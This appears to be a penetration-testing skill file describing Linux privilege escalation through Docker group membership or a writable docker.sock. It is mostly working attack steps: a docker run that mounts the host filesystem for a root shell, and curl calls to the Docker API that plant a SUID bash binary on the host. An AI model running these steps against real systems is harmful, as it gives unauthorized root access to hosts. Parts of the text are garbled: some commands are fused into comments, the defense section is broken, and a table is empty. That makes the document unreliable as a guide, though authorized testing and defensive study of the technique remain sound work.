---
name: docker-daemon-privesc
description: >
  Exploit misconfigured Docker environments, specifically focusing on privilege escalation 
  via an exposed Docker daemon socket (`docker.sock`) or membership in the local `docker` 
  user group to achieve root access on the host system.
domain: cybersecurity
subdomain: penetration-testing
category: Privilege Escalation
difficulty: intermediate
estimated_time: "1 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1611, T1548]
platforms: [linux, container]
tags: [docker, privesc, local-privilege-escalation, container-escape, docker-sock, linux]
tools: [docker, curl]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Docker Daemon Privilege Escalation

## When to Use
- During a Linux local privilege escalation phase.
- When you have a shell as a non-root user who is a member of the `docker` group.
- When you discover a writable Docker socket (e.g., `/var/run/docker.sock`) mounted inside a container or accessible on the host.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Enumeration

```bash
# Concept: Check if the current user is in the docker group or if the socket is writable. id
# Output: uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Check socket permissions ls -l /var/run/docker.sock
# Output: srw-rw---- 1 root docker 0 Oct 26 10:00 /var/run/docker.sock
```

### Phase 2: Exploitation via Docker CLI

If the `docker` command is available:
```bash
# docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# id
# Output: uid=0(root) gid=0(root) groups=0(root)
```
*(Explanation: This mounts the host's root filesystem `/` into the container at `/mnt` and drops you into a shell inside the container but chrooted to the host's filesystem as root).*

### Phase 3: Exploitation via API (Curl)

If the `docker` CLI tool is not installed, but you can write to the socket:
```bash
# curl -X POST -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh -c \"cp /bin/bash /mnt/tmp/bash && chmod +s /mnt/tmp/bash\""],"Binds":["/:/mnt"]}' --unix-socket /var/run/docker.sock http://localhost/containers/create

# Start the container curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start

# Execute the SUID binary on the host tmp/bash -p
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Enumerate Docker ] --> B{In Docker Group / Socket Access? ]}
    B -->|Yes| C[Is Docker CLI present? ]
    B -->|No| D[Check other PrivEsc vectors ]
    C -->|Yes| E[Run container mounting Host FS ]
    C -->|No| F[Curl Docker API ]
```

## 🔵 Blue Team Detection & Defense
- **Rootless Docker**: **Avoid Adding Users to Docker Group**: **Audit Logging for Docker Socket**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Docker Daemon Privesc — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- GTFOBins: [Docker](https://gtfobins.github.io/gtfobins/docker/)
- HackTricks: [Docker Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
